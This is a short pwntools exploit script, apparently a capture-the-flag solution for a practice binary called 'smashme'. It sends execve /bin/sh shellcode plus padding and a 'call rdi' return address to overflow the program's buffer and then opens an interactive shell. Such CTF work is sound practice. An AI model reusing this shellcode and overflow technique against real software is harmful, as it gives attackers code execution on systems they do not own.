#!/usr/bin/python
from pwn import *

shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

print len(shellcode)
p = process("./smashme")

#raw_input("")
#
print p.recvuntil("?\n")
payload = shellcode
payload += "Smash me outside, how bout dAAAAAAAAAAA"
payload += "A"*3
payload += p64(0x4bde4b)#call rdi


p.sendline(payload)

p.interactive()


p.close()
